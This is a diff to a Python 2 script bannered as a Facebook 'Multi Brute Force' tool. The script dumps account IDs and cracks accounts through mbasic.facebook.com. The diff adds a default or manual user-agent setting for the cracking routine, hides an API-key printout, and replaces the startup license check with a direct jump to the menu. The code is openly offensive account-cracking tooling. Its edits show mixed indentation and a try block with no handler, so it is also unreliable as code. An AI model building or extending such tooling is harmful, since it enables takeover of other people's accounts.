@@ -31,7 +31,6 @@ def banner():
     print("""    ___              \n   / _ \_______ __ _ ® ┌──────────────────────────────┐\n  / ___/ __/ -_)  ' \  │  Script By Dapunta Khurayra  │\n / /  /_/  \__/_/_/_/  │   •• Github.com/Dapunta ••   │\n/_/ Multi Brute Force  └──────────────────────────────┘""")
 
 host="https://mbasic.facebook.com"
-ua="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 ips=None
 try:
 	b=requests.get("https://api.ipify.org").text.strip()
@@ -120,7 +119,6 @@ def gets_dict_cookies(cookies):
 			result.update({i.split("=")[0]:i.split("=")[1]})
 		return result
 
-### LISENSI ###
 def license():
 	try:
 		toket = open('.api.key','r').read()
@@ -133,7 +131,7 @@ def license():
 		gagal()
 	else:
 		asup()
-#### ASUP ###
+
 def asup():
     os.system('clear')
     banner()
@@ -148,7 +146,7 @@ def asup():
     raw_input('\n[ Enter ]')
     os.system('am start https://wa.me/6282245780524?text=Please%20Confirm%20My%20ID%20' + id + ' >/dev/null')
     exit()
-### GAGAL ###
+
 def gagal():
     try:
         j = open('.api.key', 'r').read()
@@ -222,7 +220,7 @@ def log_token():
         print ("[!] Token Invalid")
         os.system('clear')
         logs()
-		
+
 def gen():
         os.system("clear")
         banner()
@@ -284,7 +282,7 @@ def menu():
 	print("\n[ Welcome "+a['name']+" ]")
         print("\n[•] Your ID : "+id)
         print("[•] Your IP : "+ip)
-        print("[•] Your Api Key : "+open('.api.key').read())
+        #print("[•] Your Api Key : "+open('.api.key').read())
         print("[•] Status : \x1b[0;32mPremium\x1b[0;37m")
         print("[•] Joined : "+durasi)
 	print("\n[1] Dump ID From Public/Friend")
@@ -303,7 +301,7 @@ def choose_menu():
     elif r=="2":
 	follow()
     elif r=="3":
-	pilihcrack()
+	useragent()
     elif r=="0":
 	try:
 		os.system('rm -rf login.txt')
@@ -313,6 +311,31 @@ def choose_menu():
     else:
 	print ("[!] Wrong Input")
 	menu()	
+
+def useragent():
+    uz = raw_input("\n[•] Use Default/Manual User Agent? [d/m] : ")
+    if uz=="":
+        print("\n[!] Fill In The Correct")
+        menu()
+    elif uz=="d":
+        try:
+            ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
+            dpnt = open('useragent.txt','w')
+            dpnt.write(ua)
+            dpnt.close()
+            pilihcrack()
+        except KeyboardInterrupt:
+            os.sys.exit()
+    elif uz=="m":
+        try:
+            ua = raw_input("[•] User Agent : ")
+            dpnt = open('useragent.txt','w')
+            dpnt.write(ua)
+            dpnt.close()
+            pilihcrack()
+    else:
+        print("\n[!] Fill In The Correct")
+        menu()
 
 def pilihcrack():
   print ("\n[1] Crack Mbasic (Low Crack)")
@@ -433,7 +456,13 @@ def generate(text):
 	return results
 
 def mbasic(em,pas,hosts):
-	global ua,mbasic_h
+    global mbasic_h
+    try:
+		ua = open('useragent.txt','r').read()
+	except IOError:
+		print("\n[!] Wrong User Agent")
+		os.system('rm -rf useragent.txt')
+		menu()
 	r=requests.Session()
 	r.headers.update(mbasic_h)
 	p=r.get("https://mbasic.facebook.com/")
@@ -907,4 +936,4 @@ def wangsaff():
     menu()
 
 if __name__=='__main__':
-	license()
+	menu()
